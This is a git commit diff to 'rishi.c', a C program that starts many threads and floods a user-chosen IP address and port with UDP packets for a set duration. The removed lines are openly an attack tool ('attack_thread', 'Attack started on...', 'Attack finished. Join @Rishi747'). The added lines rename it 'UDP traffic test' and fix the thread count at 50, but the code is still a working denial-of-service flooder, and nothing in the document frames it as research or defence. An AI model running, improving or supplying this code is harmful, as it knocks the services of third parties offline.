19381fb91e4b9c03c427109d2b551f72f4e8e4e3
Yogender <129525898+yogender747@users.noreply.github.com>
2025-01-23 23:07:42 +0530

    Update rishi.c

--- rishi.c
+++ rishi.c
@@ -1,36 +1,26 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <unistd.h>
 #include <arpa/inet.h>
 #include <pthread.h>
 #include <time.h>
-#include <signal.h>
-#include <unistd.h>
 
-#define PAYLOAD_SIZE 1
+#define BUFFER_SIZE 9000
 
-void generate_payload(char *buffer, size_t size) {
-    const char hex_chars[] = "0123456789abcdef";
-    for (size_t i = 0; i < size; i++) {
-        buffer[i * 4] = '\\';
-        buffer[i * 4 + 1] = 'x';
-        buffer[i * 4 + 2] = hex_chars[rand() % 16];
-        buffer[i * 4 + 3] = hex_chars[rand() % 16];
-    }
-    buffer[size * 4] = '\0';
-}
+// Global variables
+char *ip;
+int port;
+int duration;
 
-void *attack_thread(void *arg) {
-    char *ip = ((char **)arg)[0];
-    int port = atoi(((char **)arg)[1]);
-    int duration = atoi(((char **)arg)[2]);
-
+// Function to send UDP traffic
+void *send_udp_traffic(void *arg) {
     int sock;
     struct sockaddr_in server_addr;
-    time_t endtime;
-    char payload[PAYLOAD_SIZE * 4 + 1];
-    generate_payload(payload, PAYLOAD_SIZE);
+    char buffer[BUFFER_SIZE];
+    int sent_bytes;
 
+    // Create a socket
     if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
         perror("Socket creation failed");
         pthread_exit(NULL);
@@ -39,12 +29,21 @@ void *attack_thread(void *arg) {
     memset(&server_addr, 0, sizeof(server_addr));
     server_addr.sin_family = AF_INET;
     server_addr.sin_port = htons(port);
-    server_addr.sin_addr.s_addr = inet_addr(ip);
+    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
+        perror("Invalid address/ Address not supported");
+        close(sock);
+        pthread_exit(NULL);
+    }
 
-    endtime = time(NULL) + duration;
-    while (time(NULL) <= endtime) {
-        ssize_t payload_size = strlen(payload);
-        if (sendto(sock, payload, payload_size, 0, (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
+    snprintf(buffer, sizeof(buffer), "UDP traffic test");
+
+    time_t start_time = time(NULL);
+    time_t end_time = start_time + duration;
+
+    while (time(NULL) < end_time) {
+        sent_bytes = sendto(sock, buffer, strlen(buffer), 0,
+                            (struct sockaddr *)&server_addr, sizeof(server_addr));
+        if (sent_bytes < 0) {
             perror("Send failed");
             close(sock);
             pthread_exit(NULL);
@@ -52,54 +51,32 @@ void *attack_thread(void *arg) {
     }
 
     close(sock);
-    return NULL;
-}
-
-void handle_sigint(int sig) {
-    printf("\nStopping attack...\n");
-    exit(0);
-}
-
-void usage() {
-    printf("Usage: ./rishi ip port duration threads\n");
-    exit(1);
+    pthread_exit(NULL);
 }
 
 int main(int argc, char *argv[]) {
-    if (argc != 5) {
-        usage();
+    if (argc != 4) {
+        fprintf(stderr, "Usage: %s <IP> <PORT> <DURATION>\n", argv[0]);
+        exit(EXIT_FAILURE);
     }
 
-    char *ip = argv[1];
-    int port = atoi(argv[2]);
-    int duration = atoi(argv[3]);
-    int threads = atoi(argv[4]);
+    ip = argv[1];
+    port = atoi(argv[2]);
+    duration = atoi(argv[3]);
 
-    signal(SIGINT, handle_sigint);
-
-    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
-    if (thread_ids == NULL) {
-        perror("Memory allocation failed for thread IDs");
-        exit(1);
-    }
-
-    char *args[3] = {ip, argv[2], argv[3]};
-
-    printf("Attack started on %s:%d for %d seconds with %d threads\n", ip, port, duration, threads);
+    const int threads = 50;
+    pthread_t tid[threads];
 
     for (int i = 0; i < threads; i++) {
-        if (pthread_create(&thread_ids[i], NULL, attack_thread, args) != 0) {
+        if (pthread_create(&tid[i], NULL, send_udp_traffic, NULL) != 0) {
             perror("Thread creation failed");
-            exit(1);
+            exit(EXIT_FAILURE);
         }
-        printf("Launched thread with ID: %ld\n", (long)thread_ids[i]);
     }
 
     for (int i = 0; i < threads; i++) {
-        pthread_join(thread_ids[i], NULL);
+        pthread_join(tid[i], NULL);
     }
 
-    free(thread_ids);
-    printf("Attack finished. Join @Rishi747\n");
     return 0;
 }
